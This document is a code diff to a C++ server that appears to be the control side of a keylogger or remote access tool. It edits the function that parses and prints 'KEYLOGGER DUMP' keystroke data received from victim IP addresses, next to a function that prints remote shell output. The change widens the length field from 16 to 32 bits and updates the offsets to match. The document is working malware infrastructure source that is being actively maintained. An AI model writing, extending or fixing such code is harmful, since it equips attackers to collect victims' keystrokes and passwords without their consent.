@@ -292,7 +292,7 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
 }
 
 void Server::printKeylogData(const std::string& ip, const std::string& payload) {
-    if (payload.size() < 10) return;
+    if (payload.size() < 12) return;
 
     uint32_t seq = (static_cast<uint32_t>(static_cast<uint8_t>(payload[0])) << 24) |
                    (static_cast<uint32_t>(static_cast<uint8_t>(payload[1])) << 16) |
@@ -304,12 +304,14 @@ void Server::printKeylogData(const std::string& ip, const std::string& payload) 
                    (static_cast<uint32_t>(static_cast<uint8_t>(payload[6])) << 8)  |
                     static_cast<uint32_t>(static_cast<uint8_t>(payload[7]));
                     
-    uint16_t len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[8])) << 8)  |
-                    static_cast<uint16_t>(static_cast<uint8_t>(payload[9]));
+    uint32_t len = (static_cast<uint32_t>(static_cast<uint8_t>(payload[8])) << 24) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[9])) << 16) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[10])) << 8) |
+                    static_cast<uint32_t>(static_cast<uint8_t>(payload[11]));
                     
-    if (payload.size() < static_cast<size_t>(10 + len)) return;
+    if (payload.size() < static_cast<size_t>(12 + len)) return;
     
-    std::string keystrokes = payload.substr(10, len);
+    std::string keystrokes = payload.substr(12, len);
     
     std::cout << "\n" << std::setfill('*') << std::setw(60) << "" << "\n";
     std::cout << "[Server] KEYLOGGER DUMP from " << ip << "\n";
